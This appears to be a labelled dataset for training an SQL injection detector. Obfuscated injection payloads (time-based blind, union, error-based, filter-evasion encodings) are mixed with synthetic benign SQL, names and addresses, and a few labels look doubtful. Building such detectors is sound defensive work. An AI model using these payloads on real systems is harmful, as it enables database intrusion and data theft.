Query,Label
1/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/or/%2A%2A/4240/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/select/%2A%2A/4240/%2A%2A/from/%2A%2A/pg_sleep/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/5/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/--,1
SELECT COUNT ( escape ) FROM offer,0
sant aniol de finestres,0
1%22%20%20%29%20%20%20waitfor%20delay%20%270%3A0%3A5%27/%2A%21and%2A/%20%20%28%20%20%22vjpg%22%20%20%3D%20%20%22vjpg,1
"SELECT Employees.laugh, COUNT ( Orders.orderID )  AS globeFROM    ( OrdersINNER JOIN generally ON Orders.mayID  =  Employees.meltedID )",0
SELECT * FROM Customers   WHERE CustomerName NOT LIKE 'a%';,0
02650843r,0
1%27%09rlike%0Bsleep%C2%A0%0C%28%0C%C2%A05%09%09%29%0B%C2%A0%09and%0B%27gtfo%27%09%0B%3D%09%0C%27gtfo,1
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_captcha_settings' LIMIT 1,0
1'  )   Where 6092  =  6092,1
hache6,0
SELECT realize FROM thrown UNION ALL SELECT full FROM of ORDER BY friendly,0
SELECT * FROM consider WHERE wrote NOT LIKE 'floor%',0
ns,1
1%27%2B%20%20%28%20%20select%20tvpj%20where%207058%20%20%3D%20%207058%20or%208384%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2B%27,1
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20/%2A%21%26%26%2A/8594%20%20%3D%20%20%20%20%28%20/%2A%21select%2A/8594/%2A%21from%2A/pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20--,1
24n1e39,0
1%22%0C%09%29%09%09%09where%0C8702%09%0B%3D%0C%0B8702%0Cunion%0Ball%C2%A0select%09null%2Cnull%2Cnull%2Cnull%2Cnull--,1
"SELECT * FROM realize ORDER BY friend ASC, ask DESC",0
"SELECT change, dance, toyFROM value WHERE came  IS NOT NULL",0
SELECT TOP 3 * FROM know WHERE aloud = 'buffalo' SELECT * FROM hurt,0
"-5910%'   )    )     )  /*!uniOn*//*!all*//*!seLEcT*/5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",1
1%27%20where%206795%20%20%3D%20%206795%20%26%26%208635%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20--,1
SELECT once ( s )  FROM afraid UNION ALL,0
"SELECT Employees.blew, COUNT ( Orders.sentID )  AS paperFROM    ( OrdersINNER JOIN man ON Orders.girlID  =  Employees.cowID )",0
SELECT TOP 3 * FROM say,0
kofoed@serviconlevante.mr,0
"SELECT Orders.collectrID, Employees.current, Employees.kind FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settingID ORDER BY Orders.fourID",0
calle ecuador 143,0
slezak@ballerpoker.kn,0
SELECT * FROM clothing WHERE shaking BETWEEN which09/01/1996plate AND meant15/31/1996lie,0
1/**//**/)/**//**//**/ORder/**/bY/**/1#,1
-8710 Or 9323 like 9323#,1
1'  )  /*!AnD*/4822  =  6997/*!AnD*/  (  'ojku'  =  'ojku,1
"1""   )    )     )   || 8315 LIKE (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   &&    (    (     (  ""gimc"" like ""gimc",1
"select count  (  *  )  /*!from*/rdb$fields/*!as*/t1,rdb$types/*!as*/t2,rdb$collations/*!as*/t3,rdb$functions/*!as*/t4  )  ||'",1
SELECT TOP 50 PERCENT * FROM cook SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0
SELECT * FROM addition WHERE tonight BETWEEN '1996-07-01' AND '1996-07-31',0
1'+/**//**/(/**//**/SelEcT/**/'kcix'/**/Where/**/1117/**//**/=/**//**/1117,1
5.77313E+14,0
1%'&&  ( 2439LIKE 2555) *2555	&&'%'	LIKE	',1
SELECT MIN ( body )  AS mixture FROM cheese,0
litago,0
"1""/**/) 	where	9295= 9295and7756= dbms_utility.sqlid_to_sqlhash ( (  chr		( 113)	||chr ( 113	 )||chr	(112)||chr	 (106)||chr(113 )||  (	select	  (	casewhen   (7756= 	7756 	)then 1else 0 end ) 	fromdual) 	||chr	(		113 ) ||chr	(122 )		||chr	(  118 )  ||chr	( 122 )		||chr  (113	 	)		)	 	) --",1
perpi izurrieta,0
"1%'/**//**/)/**//**//**/or/**/elt/**//**/(/**//**/6272/**//**/=/**//**/6272,sleep/**//**/(/**//**/5/**//**//**/)/**//**//**//**/)/**//**//**//**/and/**//**//**/(/**//**/'%'/**//**/=/**//**/'",1
23593437z,0
SELECT * FROM  ( SELECT either FROM parallel ),0
2.77767E+15,0
"1"" )	oR chaR  (		75)||chaR 	(	70	)	||chaR( 99)	||chaR(	83 )			= regexp_substring( repeat (	LeFT	(	crypt_key ( chaR	 (	65	) ||chaR ( 	69) 	||chaR	(	83	) ,NuLl	)	,0 )	,500000000	)  ,NuLl 	) --",1
"UPDATE camp SET right =  'forest', City =  'young' WHERE main =  ring",0
SELECT * FROM  ( SELECT life FROM paid ),0
"SELECT WEEKDAY ( ""2017-01-01"" ) ;",0
boys@muebetuweb.mu,0
SELECT swing ( s )  FROM whatever UNION ALL,0
humaina,0
e5670cij3,0
"-2168""   )    )    UNIon All sELEcT 4935,4935,4935,4935,4935,4935,4935,4935,4935--",1
select%09%2A%09from%0Cgenerate_series%C2%A0%0B%28%0C%0B3427%2C3427%2Ccase%0Cwhen%09%0B%0B%28%09%0B3427%09%C2%A0%3D%0C%097516%C2%A0%0B%29%0B%09%C2%A0then%0C1%09else%0B0%0Cend%09%C2%A0%29%C2%A0%0B%C2%A0limit%C2%A01--,1
protectorio,0
kinsey@etnics.fm,0
SELECT COUNT ( sail )  FROM traffic,0
"SELECT * FROM average ORDER BY sure, find",0
SelECt   (  CASE WheN   (  3444 LIKE 8424  )   THEN 3444 eLSe 3444*  (  SelECt 3444 fROm information_schema.character_sets  )   End  )  #,1
38747118f,0
salustio,0
SELECT TOP 3 * FROM replied WHERE fill = 'ordinary',0
SELECT * FROM breathing WHERE dropped NOT LIKE 'bottom%',0
SELECT COUNT ( tightly )  FROM eleven,0
guinea hinojar,0
acho queralt,0
"UPDATE football SET offer =  'tomorrow', City =  'due' WHERE after =  exchange",0
SELECT * FROM announced WHERE bite LIKE '%well%',0
SELECT * FROM those WHERE pine IN  ( SELECT passage FROM verb ),0
SELECT * FROM basket  WHERE joy NOT LIKE '[blow]%',0
coripe,0
06363808f,0
ornellas3@professionalhost.com.pro,0
SELECT AVG ( upper ) FROM turn SELECT SUM ( pull ),0
"select/**/sleep  (	 5  )			&& ( ""innk""  =	""innk",1
sant pere de ribes,0
SELECT * FROM shake ORDER BY jar DESC,0
SELECT look ( s FROM mostly RIGHT JOIN,0
"SELECT business, energy, threw FROM harbor WHERE do  IS NULL",0
birney-warbeck@lamejorplaya.gl,0
SELECT * FROM electric WHERE distant NOT LIKE 'plenty%',0
"seLEct/**/dbms_pipe.receive_message/**//**/(/**//**/chr/**//**/(/**//**/66/**//**/)/**//**/||chr/**//**/(/**//**/67/**//**/)/**//**/||chr/**//**/(/**//**/79/**//**/)/**//**/||chr/**//**/(/**//**/101/**//**/)/**//**/,5/**//**/)/**//**//**/frOM/**/dual/**/anD/**//**//**//**/(/**//**//**//**/(/**//**//**/'quqx'/**//**/=/**//**/'quqx",1
select/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/case/%2A%2A/when/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/9343/%2A%2A/LIKE/%2A%2A/9513/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/then/%2A%2A/1/%2A%2A/else/%2A%2A/9343%2A/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/select/%2A%2A/9343/%2A%2A/from/%2A%2A/master..sysdatabases/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/end/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/--,1
SELECT protection FROM riding,0
"SELECT riding,brush FROM value WHERE above = 'family' UNION SELECT thread, supply FROM liquid",0
1%22%20%20%29%20%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204587%20%20%3D%20%204587%20%20%29%20%20%20then%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20else%20char%20%20%28%20%2076%20%20%29%20%20%7C%7Cchar%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%20102%20%20%29%20%20%7C%7Cchar%20%20%28%20%2072%20%20%29%20%20%20end%20%20%29%20%20%20from%20%20%20%28%20%20values%20%20%28%20%200%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20%22usht%22%20like%20%22usht,1
6703,0
victoria,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_1_link' LIMIT 1,0
"SELECT SUBTIME ( ""2017-06-15 10:24:21.000004"", ""5.000001"" ) ;",0
antigua,0
cervantes,0
SELECT TOP 50 PERCENT * FROM yesterday,0
SELECT * FROM stepped WHERE tip NOT LIKE 'add%',0
SELECT phrase,0
SELECT TOP 3 * FROM powerful,0
SELECT AVG ( classroom ) FROM reach SELECT SUM ( due ),0
-5757%25%22%C2%A0%C2%A0%29%09%0C%0Bor%C2%A06872%09%0C%3D%09%0B6872%0Band%C2%A0%C2%A0%0C%28%09%C2%A0%22%25%22%0C%C2%A0%3D%09%0C%22,1
lo7ange,0
1'	) &&8404LIKE	8651#,1
"1'+	( selectxlvqwhere	7470 LIKE 7470&&3707 LIKE (select count (* 	)		fromsysibm.systables ast1,sysibm.systablesast2,sysibm.systables	as t3		 )			)	+'",1
SELECT DISTINCT weather FROM discussion,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%26%26%205421%20LIKE%204804--,1
"1'+/**//**/(/**//**/SeLeCT/**/bldn/**/WHErE/**/8321/**//**/=/**//**/8321/**/And/**/8635/**//**/=/**//**//**//**/(/**//**/SeLeCT/**/count/**//**/(/**//**/*/**//**/)/**//**//**/FROM/**/generate_series/**//**/(/**//**/1,5000000/**//**//**/)/**//**//**//**/)/**//**//**/--",1
"roure, 43, 3?d",0
SELECT FROM_DAYS ( 780500 ) ;,0
manquel,0
-3420%20where%209681%20%20%3D%20%209681%20%7C%7C%20make_set%20%20%28%20%202438%20%20%3D%20%201977%2C1977%20%20%29%20%20--,1
alberite de san juan,0
SELECT halfway ( s ) FROM spread INNER JOIN,0
SELECT * FROM farm,0
SELECT cover ( s )  FROM pay FULL OUTER JOIN,0
limitable,0
end && 'wdce' LIKE 'wdce,1
SELECT * FROM  ( SELECT troops FROM farm ),0
fowley5@virginislands.com.eg,0
"SELECT Employees.gentle, COUNT ( Orders.likelyID )  AS roughFROM    ( OrdersINNER JOIN powder ON Orders.cityID  =  Employees.starID )",0
"1""   )    )     )  /*!||*//*!sleep*/ (  5  )  /*!&&*/   (    (     (  ""hdis""/*!like*/""hdis",1
SELECT * FROM swing WHERE cross = 'straight',0
SELECT number ( s )  FROM here FULL OUTER JOIN,0
1%27%2B%C2%A0%0C%28%C2%A0%0C/%2A%21select%2A/%C2%A0%27vidl%27%C2%A0/%2A%21where%2A/%099445%09%C2%A0%3D%0B%099445%0C/%2A%21and%2A/%095498%09%C2%A0%3D%09%0B5777%23,1
fantaseadora,0
1%22%20%20%29%20%20%20where%205358%20%20%3D%20%205358,1
SELECT * FROM studied FETCH FIRST 50 PERCENT ROWS ONLY,0
1%22%0C%C2%A0%0C%29%09%0C%0B%0C%29%0B%0C%09%09as%0Cyuqr%0Cwhere%C2%A07226%C2%A0%C2%A0%3D%0C%0B7226%09and%C2%A0%09%0C%28%C2%A0%0Cselect%0C%2A%0Cfrom%C2%A0%0B%0B%28%0B%0Bselect%0C%0C%28%09%0Csleep%0B%09%28%09%0C5%0B%0C%0C%29%C2%A0%09%0C%0B%29%0B%0B%C2%A0%C2%A0%0C%29%C2%A0%0Bgcrr%C2%A0%0B%29%0C%0C%23,1
"""/**/||/**/""""-""",1
"UPDATE dried SET swim =  'north', City =  'huge' WHERE flight =  saved",0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20owcw%20where%201107%20%20%3D%20%201107%20and%208312%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2069%20%20%29%20%20%7C%7Cchr%20%20%28%20%2079%20%20%29%20%20%7C%7Cchr%20%20%28%20%20101%20%20%29%20%20%7C%7Cchr%20%20%28%20%2068%20%20%29%20%20%2C5%20%20%29%20%20--,1
1%C2%A0%C2%A0%0B%29%0B%09%09%0B%29%C2%A0%0B%09%C2%A0union%0Call%C2%A0select%C2%A0null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
"1,  (  Select * froM generate_series  (  5609,5609,caSe WHEN   (  5609 lIKe 5609  )   tHen 1 ELse 0 end  )   LiMiT 1  )",1
mendracaveitia torreyas,0
"1"" where 3740 LIKE 3740 rlike sleep  (  5  )  #",1
SELECT COUNT ( market ) FROM grew,0
56702228y,0
SELECT joy ( s )  FROM general UNION ALL,0
"1%""/**//**//**/)/**//**//**//**/)/**//**//**//**/aND/**/extractvalue/**//**/(/**//**/7982,concat/**//**/(/**//**/0x5c,0x7171706a71,/**//**/(/**//**/sEleCT/**//**//**/(/**//**/elt/**//**/(/**//**/7982/**//**/=/**//**/7982,1/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/,0x717a767a71/**//**//**/)/**//**//**//**/)/**//**//**//**/aND/**//**//**//**/(/**//**//**//**/(/**//**//**/""%""/**//**/=/**//**/""",1
"SELECT about,bigger FROM began WHERE vote = 'wire' UNION SELECT captain, essential FROM growth",0
"1""   )    )   /*!union*//*!all*//*!select*//*!null*/,/*!null*/,/*!null*/,/*!null*/,/*!null*/,/*!null*/--",1
"selecT/**/*/**/FROm/**/users/**/where/**/id/**//**/ LIKE /**//**/1/**/Or/**/""].""/**/Or/**/1/**//**/ LIKE /**//**/1/**/--/**/1",1
"SeLECT * fRoM users WHeRE id LIKE 1 || 1#""@ uNIoN SeLECT 'a',veRSion  (    )   -- 1",1
"1'/**//**//**/)/**//**//**//**/)/**//**//**//**//*!uNIOn*//**//*!ALl*//**//*!SeLect*//**//*!nuLl*/,/*!nuLl*/,/*!nuLl*/,/*!nuLl*/,/*!nuLl*/,/*!nuLl*/,/*!nuLl*/,/*!nuLl*/--",1
SELECT * FROM replace FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM policeman,0
tyler,0
SELECT TOP 3 * FROM live SELECT * FROM dead 3SELECT * FROM road,0
SELECT * FROM fell WHERE gulf = 'bee',0
1%25%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull--,1
SELECT * FROM Products;,0
"SELECT can, instead, term FROM official WHERE map  IS NULL",0
"SELECT shape,bet FROM milk WHERE grabbed = 'everyone' UNION SELECT mathematics, voyage FROM torn",0
SELECT * FROM widely WHERE offer = 'interior' FETCH FIRST 3 ROWS ONLY,0
"1%'/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//*!and*//*!char*//**/(/**//**/109/**//**/)/**//**/||/*!char*//**/(/**//**/79/**//**/)/**//**/||/*!char*//**/(/**//**/70/**//**/)/**//**/||/*!char*//**/(/**//**/90/**//**/)/**//**//**//**/=/**//**/regexp_substring/**//**/(/**//**/repeat/**//**/(/**//*!right*//**/(/**//*!char*//**/(/**//**/5012/**//**/)/**//**/,0/**//**/)/**//**/,5000000000/**//**/)/**//**/,/*!null*//**/)/**//**/--",1
"INSERT INTO solar ( army, rise, youth, course, select, electricity )  VALUES  ( 'exist', 'anywhere'. product', 'near', 'market', 'section', 'however' )",0
SELECT * FROM die WHERE hunter = 'driving',0
-4882'/*!oRDEr*//*!By*/1#,1
1g5ota323,0
3041,0
1.72E+15,0
SELECT disappear ( s )  FROM fighting UNION ALL,0
90946866j,0
"1/**/Or/**/cHar/**//**/(/**//**/68/**//**/)/**//**/||cHar/**//**/(/**//**/69/**//**/)/**//**/||cHar/**//**/(/**//**/97/**//**/)/**//**/||cHar/**//**/(/**//**/85/**//**/)/**/LIKE/**/regexp_substring/**//**/(/**//**/repeat/**//**/(/**//**/RIGHT/**//**/(/**//**/cHar/**//**/(/**//**/5389/**//**/)/**//**/,0/**//**/)/**//**/,5000000000/**//**/)/**//**/,NulL/**//**/)/**//**/--/**/xsob",1
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%208407%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27%25%27%20%20%3D%20%20%27,1
"1""/**//**//**/)/**//**//**//**/)/**//**//**//**//*!&&*//**/make_set/**//**/(/**//**/1167/**//**/=/**//**/5027,5027/**//**/)/**//**//**//*!&&*//**//**//**//**/(/**//**//**//**/(/**//**//**/""grfi""/**//**/=/**//**/""grfi",1
SELECT * FROM sold ORDER BY hot,0
-8358%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%207282%2C7282--,1
1%'/**/and 6969LIKE(select6969 frompg_sleep 	(5 ) )		and'%' LIKE',1
c356conio,0
albatana,0
SELECT * FROM group,0
"ondulada, 121",0
"SELECT Employees.dirt, COUNT ( Orders.folksID )  AS rangeFROM    ( OrdersINNER JOIN sunlight ON Orders.quicklyID  =  Employees.universeID )",0
SELECT * FROM also WHERE NOT research = 'system'  AND NOT basic = 'post',0
"seleCt/**/*/**/FROM/**/users/**/wherE/**/id/**/LikE/**/1/**/OR/**/"",;""/**/OR/**/1/**/LikE/**/1/**/--/**/1",1
1) where1487	 =	1487,1
SELECT * FROM larger ORDER BY involved DESC,0
SELECT * FROM tide WHERE there = 'built'  AND  ( colony = 'edge' OR equipment = 'owner' ),0
"1  )  /*!where*/8630  =  8630/*!union*//*!all*//*!select*//*!null*/,/*!null*/--",1
1'/*!wHerE*/2690  =  2690,1
"SELECT share, spider, plates FROM easy WHERE making  IS NULL",0
SELECT * FROM exist FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM press,0
80,0
4.79764E+15,0
indiestro,0
-4428)  || 3038 LIKE 3038,1
SELECT * FROM  ( SELECT operation FROM win ),0
1%27%20iN%20boolean%20mode%20%20%29%20%20%20OR%20%20%20%28%20%20seLeCT%209173%20FrOm%20%20%28%20%20seLeCT%20count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20seLeCT%20%20%20%28%20%20elt%20%20%28%20%209173%20LIKE%209173%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x%20FrOm%20information_schema.character_sets%20grOUp%20bY%20x%20%20%29%20%20a%20%20%29%20%20%23,1
1/%2A%2A/wHerE/%2A%2A/7932/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/7932/%2A%2A/OR/%2A%2A/exp/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/~/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/SElEcT/%2A%2A/%2A/%2A%2A/fRoM/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/SElEcT/%2A%2A/concat/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/0x7171706a71%2C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/SElEcT/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/elt/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/6270/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/6270%2C1/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%2C0x717a767a71%2C0x78/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/x/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/--,1
"1 aND 5556 LIKE (  seLecT count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",1
gaile,0
SELECT * FROM CustomersWHERE Country = 'Germany'FETCH FIRST 3 ROWS ONLY;,0
"SELECT * FROM disappear WHERE until NOT IN  ( 'factory', 'behavior', 'winter' )",0
UPDATE single SET view = 'at'WHERE huge = 'made',0
leocricia,0
SELECT * FROM pencil WHERE wheel IN  ( SELECT city FROM life ),0
"SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5 2:10:5.000003"" ) ;",0
-8515'/**/Or/**/1329/**//**/=/**//**/9536,1
SELECT * FROM dirt WHERE leg = 'sight',0
de_souza,0
14230,0
porteril,0
SELECT AVG ( pony ) FROM lips SELECT SUM ( older ),0
"1	ANdrow(  6237,7469 ) >( SELectcount (	* ) ,concat	( 0x7171706a71, (	 SELect	( elt		(6237 = 6237,1 	) 		) 	),0x717a767a71,floor	(rand	( 0 )		*2	 ) 	) xFROm ( SELect	5192 uNiONSELect3785uNiONSELect3931uNiON SELect7158)	aGRouP byx	)--	ofqd",1
SELECT * FROM thee 3 SELECT * FROM molecular,0
1'/*!AnD*/4386/*!LIKE*/utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  ( /*!SeLEct*/  ( /*!case*//*!WHEn*/  (  4386/*!LIKE*/4386  )  /*!tHEN*/1/*!ELsE*/0/*!EnD*/ )  /*!FRoM*/dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   /*!AnD*/'iuao'/*!LIKE*/'iuao,1
polvo,0
1%25%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
SELECT drove,0
1' ) /*!as*/gogu /*!where*/4338=		4338/*!union*/ /*!all*//*!select*/ /*!null*/#,1
rothamel,0
SELECT * FROM amount WHERE but = 'greater' FETCH FIRST 3 ROWS ONLY,0
"1'/**//**/)/**//**//**/&&/**//**//**/(/**//**/seLEcT/**/9067/**/FROM/**//**/(/**//**/seLEcT/**/count/**//**/(/**//**/*/**//**/)/**//**/,concat/**//**/(/**//**/0x7171706a71,/**//**/(/**//**/seLEcT/**//**//**/(/**//**/elt/**//**/(/**//**/9067/**//**/=/**//**/9067,1/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/,0x717a767a71,floor/**//**/(/**//**/rand/**//**/(/**//**/0/**//**/)/**//**/*2/**//**//**/)/**//**//**//**/)/**//**//**/x/**/FROM/**/information_schema.character_sets/**/GRoUP/**/bY/**/x/**//**/)/**//**/a/**//**/)/**//**//**/&&/**//**//**/(/**//**/'qvrd'/**//**/=/**//**/'qvrd",1
bic9spide,0
SELECT * FROM stepped FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM speak,0
SELECT * FROM right WHERE industrial NOT LIKE 'fifth%',0
SELECT * FROM fifteen WHERE stopped = 'rising' LIMIT 3,0
"1/**//**//**/)/**//**//**//**/)/**//**//**//**/as/**/huxq/**/where/**/7451/**//**/ LIKE /**//**/7451/**/union/**/all/**/select/**/null,null,null--",1
select%20%20%20%28%20/%2A%21case%2A//%2A%21when%2A/%20%20%28%20%201961%20%20%3D%20%202048%20%20%29%20%20/%2A%21then%2A/1961/%2A%21else%2A/1961%2A%20%20%28%20/%2A%21select%2A/1961/%2A%21from%2A/information_schema.character_sets%20%20%29%20%20/%2A%21end%2A/%20%29%20%20%23,1
SELECT * FROM wet FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT COUNT ( DISTINCT purple )  FROM even,0
"1%""/**/) 	or1022 LIKE (	selectcount	(* )  fromall_users	t1,all_users	t2,all_users t3,all_users	t4,all_users t5 ) --",1
SELECT * FROM positive FETCH FIRST 50 PERCENT ROWS ONLY,0
-3667%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%203560%2C3560%2C3560--,1
belalczar,0
1%27/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/and/%2A%2A/6969/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/select/%2A%2A/6969/%2A%2A/from/%2A%2A/pg_sleep/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/5/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/and/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/%27ineq%27/%2A%2A/like/%2A%2A/%27ineq,1
SELECT AVG ( Price ) FROM deal,0
"SELECT trap,chosen,eventually,journey,job     (  (  build JOIN grandmother ON satisfied.salt =  studied.eventually )   INNER JOIN perfectON Orders.coast =  whom.gentleID )",0
-8490%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%206910%2C6910%2C6910%2C6910%2C6910%2C6910%23,1
batido,0
sELECT/%2A%2A/SlEEP/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/5/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/And/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A//%2A%2A/%27%25%27/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/%27,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6623 )  ORDER BY meta_id ASC",0
"1""   )    )   /*!as*/vbdo/*!wHeRE*/3882 LIKE 3882",1
camio canexa 161 11?g,0
SELECT * FROM  ( SELECT moon FROM human ),0
2.61077E+15,0
espins marmesat,0
